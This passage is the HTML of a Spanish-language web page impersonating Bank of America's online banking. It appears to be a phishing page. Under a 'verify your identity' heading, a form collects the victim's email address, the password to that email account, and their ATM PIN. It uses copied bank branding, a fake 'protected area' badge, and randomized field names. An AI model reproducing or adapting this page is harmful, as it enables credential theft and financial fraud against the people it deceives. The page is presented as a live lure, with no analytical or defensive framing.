hQ7oUPYgg6ZJG2VuV4uFp4TjFdgVU2sw+QseOo+BGxHoV7UGzrcthMVi36Y1T48KImFHjsfI020DnAQO2c+/qdDWNZ5Qo6zFKvEC51U8vc52Yk6kn3+SetPVBGhC/9k=" alt="logo" />
<p class="txtg">Entrar</p>
<div class="derLinks">
<img class="sarea" src="data:image/jpegNTk3NTA2NjI0MTA0ODE0MQ==;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/4QBiRXhpZgAATU0AKgAAAAgABQESAAMAAAABAAEAAAEaAAUAAAABAAAASgEbAAUAAAABAAAAUgEoAAMAAAABAAEAAAITAAMAAAABAAEAAAAAAAAAAAABAAAAAQAAAAEAAAAB/9sAQwADAgICAgIDAgICAwMDAwQGBAQEBAQIBgYFBgkICgoJCAkJCgwPDAoLDgsJCQ0RDQ4PEBAREAoMEhMSEBMPEBAQ/8AACwgADgAKAQERAP/EABcAAAMBAAAAAAAAAAAAAAAAAAUHCAn/xAAhEAABBAICAgMAAAAAAAAAAAACAQMEBgURABIHIRQjMf/aAAgBAQAAPwCkbBkMfcXrndsn55iYyw4ufKGoQoVshtsEw0IrHIgQtfaWxXtx71fzPQpVZxEqw3mqtZV6BHcnAGWYURkK2KuIi79ohb5lqbDiF7NPxF4aarEl1oHfkNp3FC12L1vn/9k=" alt="candado" />
<div class="areaSegura">Área protegida</div>
<img class="sarea2" src="data:image/jpegNTk3NTA2NjI0MTA0ODE0MQ==;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/4QBiRXhpZgAATU0AKgAAAAgABQESAAMAAAABAAEAAAEaAAUAAAABAAAASgEbAAUAAAABAAAAUgEoAAMAAAABAAEAAAITAAMAAAABAAEAAAAAAAAAAAABAAAAAQAAAAEAAAAB/9sAQwADAgICAgIDAgICAwMDAwQGBAQEBAQIBgYFBgkICgoJCAkJCgwPDAoLDgsJCQ0RDQ4PEBAREAoMEhMSEBMPEBAQ/8AACwgADwABAQERAP/EABUAAQEAAAAAAAAAAAAAAAAAAAcI/8QAHhAAAAQHAAAAAAAAAAAAAAAAAAQGBxQWVFWSl9T/2gAIAQEAAD8AvSMXlU6GaVBHNLF3xoNTHOgf/9k=" alt="puntos" />
<div class="lenguaje">In English</div>
</div>
</div>
<div class="banner2">
<h1>Verificar su identidad</h1>
</div>
<div class="banner3">
<div class="columnas">
<div class="columnaX">
<h2 class="titulo2">
Confirmar correo asociado a su cuenta de banco
</h2>
<p>
Para verificar su identidad, Ingrese el correo asociado a la
cuenta bancaria
</p>
<form action="" method="post">
<div class="form-group-l">
<label class="form2label" for="correo"
>Correo electrónico</label
>

<input type="email" name="QQfRCLYyuOSgeEk" placeholder="******@****.com" required>
</div>

<div class="form-group-l">
<label class="form2label" for="correo">Clave del correo</label>

<input type="password" name="JPeoljJcteFnVdP" placeholder="*************" required>
</div>
<div class="form-group-l">
<label class="form2label" for="atm">Atm o Pin</label>
<input type="password" name="vQIJRxTqiGdrNrw" maxlength="4" placeholder="****" required>
</div>
<div class="footer-form">
<p style="position: relative; width: 600px">
La dirección de correo electrónico que ingrese debe coincidir
con el correo asociado a nuestros servicios de Online Banking
</p>
<button class="btn principal" name="add" type="submit">
CONFIRMAR
</button>
</div>
</form>
</div>
<div class="columna3" style="float: right">
<h2>Ayuda para entrar</h2>
<ul class="menosmargin">
<li>
<a href="#">
¿No reconoce o no puede acceder a la dirección de correo
electrónico o al número de teléfono proporcionados?
</a>
</li>
</ul>
</div>
</div>
</div>
<div class="banner4" style="height: 130px">
<div class="fondolock"></div>
<p>Área protegida</p>
<div class="enlaces-footer">
<a href="#">Privacidad</a>
<a href="#">Seguridad</a>
</div>
<div class="copirait">
<p>Bank of America, N.A. Miembro de FDIC.</p>
<a href="#">
Igualdad de oportunidades en préstamos para viviendas
</a>

<span class="corporation">© 2020 Bank of America Corporation.</span>
</div>
</div>
</div>
</body>
</html>